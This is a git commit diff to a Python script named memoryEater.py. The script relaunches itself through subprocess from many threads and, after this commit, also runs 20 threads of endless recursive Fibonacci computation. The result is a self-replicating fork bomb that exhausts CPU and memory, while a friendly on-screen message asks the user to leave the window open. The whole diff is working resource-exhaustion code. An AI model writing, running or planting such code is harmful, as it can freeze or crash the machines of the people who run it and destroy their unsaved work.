2ec668d1cc23016cdcf699b673e4ac700dc5fc90
Ryder7223 <114200735+ryder7223@users.noreply.github.com>
2026-03-10 15:17:45 +0800

    Update memoryEater.py

--- memoryEater.py
+++ memoryEater.py
@@ -6,9 +6,29 @@ sys.stdout.write("\ri hello please leave me open thanks :3")
 sys.stdout.flush()
 
 def runSelf():
-	subprocess.check_call([sys.executable] + sys.argv)
+    subprocess.check_call([sys.executable] + sys.argv)
 
-threads = [threading.Thread(target=runSelf) for _ in range(20)]
+def extraWork():
+    def fib(n):
+        if n <= 1:
+            return n
+        return fib(n - 1) + fib(n - 2)
+
+    for i in range(10000000000000000000000000000):
+        fib(i)
+
+threads = [threading.Thread(target=extraWork) for _ in range(20)]
 
 for thread in threads:
     thread.start()
+
+for thread in threads:
+    thread.join()
+
+threads2 = [threading.Thread(target=runSelf) for _ in range(20)]
+
+for thread in threads2:
+    thread.start()
+
+for thread in threads2:
+    thread.join()
